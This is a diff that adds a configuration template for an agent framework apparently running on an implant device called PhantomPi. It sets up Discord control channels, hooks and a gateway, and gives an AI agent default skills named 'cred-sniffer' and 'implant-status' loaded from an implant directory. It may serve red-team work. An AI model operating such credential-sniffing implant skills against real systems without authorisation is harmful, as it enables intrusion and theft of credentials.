@@ -1,0 +1,71 @@
+{
+    // ─── OpenClaw Configuration for PhantomPi VPS ───
+    // Copy to ~/.openclaw/openclaw.json and fill in values.
+    // Tokens should be set in ~/.openclaw/.env instead.
+
+    "channels": {
+        "discord": {
+            "enabled": true,
+            "token": {
+                "source": "env",
+                "provider": "default",
+                "id": "DISCORD_BOT_TOKEN"
+            },
+            "dmPolicy": "allowlist",
+            "groupPolicy": "allowlist",
+            "guilds": {
+                "__GUILD_ID__": {
+                    "requireMention": false,
+                    "users": [__ALLOWED_USERS__],
+                    "channels": {
+                        "__ALERT_CHANNEL_NAME__": {
+                            "enabled": true,
+                            "requireMention": false
+                        },
+                        "__CHAT_CHANNEL_NAME__": {
+                            "enabled": true,
+                            "requireMention": false
+                        }
+                    }
+                }
+            },
+            "dm": {
+                "enabled": true,
+                "allowFrom": [__DM_USERS__]
+            },
+            "historyLimit": 30,
+            "streaming": "off",
+            "textChunkLimit": 2000
+        }
+    },
+
+    "agents": {
+        "defaults": {
+            "model": "anthropic/claude-sonnet-4-6",
+            "skills": ["bridge-sync", "cred-sniffer", "implant-status"],
+        }
+    },
+
+    "skills": {
+        "load": {
+            "extraDirs": ["/opt/implant/openclaw/skills"]
+        }
+    },
+
+    "hooks": {
+        "enabled": true,
+        "token": "__HOOKS_TOKEN__",
+        "path": "/hooks",
+        "allowedAgentIds": ["hooks", "main"],
+        "defaultSessionKey": "hook:ingress",
+        "allowRequestSessionKey": true,
+        "allowedSessionKeyPrefixes": ["hook:"]
+    },
+
+    "gateway": {
+        "mode": "local",
+        "bind": "custom",
+        "customBindHost": "__GATEWAY_HOST__",
+        "port": 18789
+    }
+}
